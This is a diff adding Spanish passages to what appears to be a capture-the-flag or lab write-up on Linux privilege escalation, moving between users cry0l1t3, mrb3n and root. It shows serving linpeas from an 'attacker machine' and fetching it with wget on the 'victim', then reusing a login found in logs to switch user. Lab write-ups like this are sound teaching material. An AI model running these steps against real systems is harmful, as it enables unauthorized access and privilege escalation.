@@ -90,7 +90,40 @@ El usuario es cry0l1t3, me conectaré por SSH.
 
 ## cry0l1t3 -> Mrb3n
 
-Lo que normalmente suelo hacer una vez entro como un usuario, es visualizar a que grupos pertenezco. Esto nos da información sobre que privilegios sobre el sistema 
+Lo que normalmente suelo hacer una vez entro como un usuario, es visualizar a que grupos pertenezco. Esto nos da información sobre los privilegios que tenemos sobre el sistema 
 
 ![image](https://user-images.githubusercontent.com/87484792/186673917-ae0c889b-0bae-4a81-ad26-c5ef44347ca9.png)
+
+Pertenecemos al grupo **ADM**, este grupo nos permite leer archivos logs en */var/logs/*. Esto es muy bueno porque tenemos la posibilidad de visualizar logs de inicios de sesión. **linpeas** nos ayudará a leer todos los archivos criticos del sistema. Me lo traeré desde mi máquina y lo ejecutaré en la máquina victima.
+
+Máquina atacante:
+
+`python3 -m http.server 80`
+
+Máquina victima: 
+
+```
+wget http://ip/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+![image](https://user-images.githubusercontent.com/87484792/186680200-c25e5629-7b9f-42a1-82b1-2a302edebaab.png)
+
+Linpeas encontró un inicio de sesión sobre el usuario mrb3n. `su mrb3n` y entramos a su usuario.
+
+## mrb3n -> root
+
+Una vez dentro de mrb3n, obtenemos una shell en "sh", ejecutamos bash y obtendremos una shell en bash.
+Nuevamente me fijo en los grupos asignados al usuario, pero no hay ninguno más alla del propio grupo de usuario.
+El siguiente paso que suelo hacer es verificar si tenemos algún permiso de SUDO, en este caso si.
+
+![image](https://user-images.githubusercontent.com/87484792/186684026-334868e9-daa6-47f3-aeb5-16aa3e768d57.png)
+
+
+
+![image](https://user-images.githubusercontent.com/87484792/186680732-3b39799a-d9e9-421c-8619-2ee9f97526d5.png)
+
+
+
 
